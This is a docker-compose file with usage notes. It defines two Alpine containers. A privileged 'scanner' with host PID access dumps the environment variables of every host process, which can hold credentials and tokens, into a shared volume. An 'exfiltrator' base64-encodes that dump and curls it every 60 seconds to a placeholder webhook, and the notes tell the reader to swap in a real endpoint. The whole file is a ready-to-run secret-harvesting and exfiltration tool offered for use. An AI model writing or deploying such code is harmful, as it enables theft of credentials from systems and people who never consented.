**docker-compose.yml**
```yaml
version: '3.8'

services:
  scanner:
    image: alpine:3.20
    privileged: true
    pid: "host"
    volumes:
      - scan_data:/data
    command: >
      sh -c '
        apk add --no-cache procps;
        echo "Scanner started with pid:host and privileged mode";
        while true; do
          echo "=== Process & Environment Scan - $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" > /data/scan_results.txt;
          for p in /proc/[0-9]*; do
            pid=$(basename "$p");
            echo "PID: $pid" >> /data/scan_results.txt;
            echo "Command: $(cat "$p/comm" 2>/dev/null || echo "N/A")" >> /data/scan_results.txt;
            echo "Environ:" >> /data/scan_results.txt;
            if [ -r "$p/environ" ]; then
              cat "$p/environ" 2>/dev/null | tr "\0" "\n" >> /data/scan_results.txt;
            else
              echo "  (unreadable)" >> /data/scan_results.txt;
            fi;
            echo "-------------------" >> /data/scan_results.txt;
          done;
          echo "=== Scan completed at $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /data/scan_results.txt;
          sleep 30;
        done
      '

  exfiltrator:
    image: alpine:3.20
    volumes:
      - scan_data:/data
    environment:
      - WEBHOOK_URL=https://your-webhook.example.com/ingest
    command: >
      sh -c '
        apk add --no-cache curl;
        echo "Exfiltrator started - will send every 60s";
        while true; do
          if [ -f /data/scan_results.txt ]; then
            echo "Exfiltrating at $(date -u +%Y-%m-%dT%H:%M:%SZ)";
            CONTENT=$(base64 -w 0 /data/scan_results.txt);
            curl -s -X POST \
              -H "Content-Type: application/json" \
              -d "{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\"source\":\"docker-scanner\",\"payload\":\"$CONTENT\"}" \
              "$WEBHOOK_URL" || echo "curl failed";
          else
            echo "No scan results yet, waiting...";
          fi;
          sleep 60;
        done
      '

volumes:
  scan_data:
```

**Usage notes**

1. Replace `https://your-webhook.example.com/ingest` with your actual endpoint.
2. Run with `docker compose up -d`.
3. The `scanner` service uses `privileged: true` + `pid: host` so it can read the host's full `/proc` tree and environment variables.
4. Both services share the named volume `scan_data`. The scanner writes to `/data/scan_results.txt`; the exfiltrator reads, base64-encodes, and POSTs it.

